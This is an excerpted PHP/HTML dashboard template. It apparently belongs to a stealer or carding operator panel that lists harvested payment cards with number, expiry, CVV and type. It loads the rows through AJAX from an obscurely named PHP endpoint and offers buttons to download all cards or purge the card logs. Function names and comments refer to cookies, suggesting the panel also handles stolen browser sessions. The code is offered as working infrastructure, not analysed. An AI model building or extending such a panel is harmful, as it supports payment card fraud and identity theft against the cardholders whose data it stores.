                ...
                <div class="mx-5 mt-6">
                    ...
                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Cards';"
                        ...
                        <div class="grid grid-cols-2">
                            ...
                            <div class="2 text-right">
                                <i class="fa-solid fa-credit-card textCol mt-1 icon"></i>
                            </div>
                        </div>
                    </button>
        ...
        <div class="col-span-10 mx-5 mt-10"> <!-- CONTENT -->
            ...
            <div class="bg mt-5 rounded-lg pb-4 btn2">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-solid fa-gear mr-1 icon2"></i> Card Logs Options</h1>
                ...
                <script>
                    ...
                    function deleteRecord() {
                        if (confirm('Are you sure you want to delete ALL Your records? This action cannot be reverted.')) {
                            // Create a hidden form and submit it with the ID
                            var form = document.createElement('form');
                            form.method = 'post';
                            form.action = '';
                ...
                <div class="mx-5 mt-3">
                    <button class="text-stone-400 fntBold tracking-wide dg py-2 px-5 btn rounded-lg"
                        onclick="DownloadCooks()"><i class="fa-solid fa-file-arrow-down icon mr-1"></i> Download <span
                            class="border-b border-stone-800">All</span> Cards</button>
                    <button class="text-stone-300 fntBold tracking-wide bgCol py-2 px-5 btn rounded-lg ml-3" onclick="deleteRecord()"><i
                            class="fa-solid fa-trash icon mr-1"></i>Purge All Card Logs </button>
                </div>
            </div>
                ...
                <div class="grid grid-cols-2">
                    <div class="1">
                        ...
                        <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400">
                            <i class="fa-solid fa-credit-card mr-1 icon"></i>
                            <span id="cookiesHeaderText"> Cards</span>
                        </h1>
                    ...
                    <table id="DashTable" class="table-fixed w-full mt-5">
                        <thead class="">
                            <tr class="text-center">
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Number </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Expiry </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">CVV </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Type </h1>
                                </th>
                                <th scope="col">
                ...
                <script>
                    ...
                    function initializeDataTable() {
                        ...
                        var table = $('#DashTable').DataTable({
                            ...
                            ajax: {
                                url: 'crd3453745.php', // Replace with the correct path to your PHP script
                                type: 'POST',
                                beforeSend: function() {
                                    // Show the header text with a loading animation
                                    $('#cookiesHeaderText').html(' Cards  <i class="fas fa-spinner fa-spin"></i>');
                                },
                                complete: function() {
                                    // Restore the header text to "Cookies" after the data is loaded
                                    $('#cookiesHeaderText').html(' Cards');
                                }
                            },
                            columns: [{
                                    data: 0
